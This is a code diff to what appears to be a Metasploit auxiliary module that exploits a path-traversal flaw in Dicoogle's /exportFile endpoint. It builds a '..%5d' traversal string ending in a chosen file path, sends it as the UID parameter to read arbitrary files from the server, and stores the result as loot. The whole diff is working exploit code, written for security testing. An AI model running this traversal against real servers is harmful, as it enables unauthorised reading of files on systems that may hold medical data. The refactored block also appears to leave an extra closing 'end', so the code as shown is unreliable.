@@ -27,6 +27,7 @@ class MetasploitModule < Msf::Auxiliary
           'Carlos Avila', # Vulnerability discovery
           'h00die' # Metasploit module
         ],
+      'DisclosureDate' => 'Jul 11 2018',
       'License'     => MSF_LICENSE
     ))
 
@@ -43,25 +44,27 @@ class MetasploitModule < Msf::Auxiliary
     filename = datastore['FILEPATH']
     traversal = "..%5d" * datastore['DEPTH'] << filename
 
-    res = send_request_raw({
+    res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => "/exportFile?UID=#{traversal}"
+      'uri'    => '/exportFile',
+      'vars_get' => {
+        'UID' => traversal
+      }
     })
 
-    if res && res.code == 200
-      print_good("#{res.body}")
+    unless res && res.code == 200
+      print_error('Nothing was downloaded')
+      return
+    end
 
-      path = store_loot(
-        'dicoogle.traversal',
-        'text/plain',
-        ip,
-        res,
-        filename
-      )
-
-      print_good("File saved in: #{path}")
-    else
-      print_error("Nothing was downloaded")
+    vprint_good("#{res.body}")
+    path = store_loot(
+      'dicoogle.traversal',
+      'text/plain',
+      ip,
+      res.body,
+      filename
+    )
     end
   end
 end
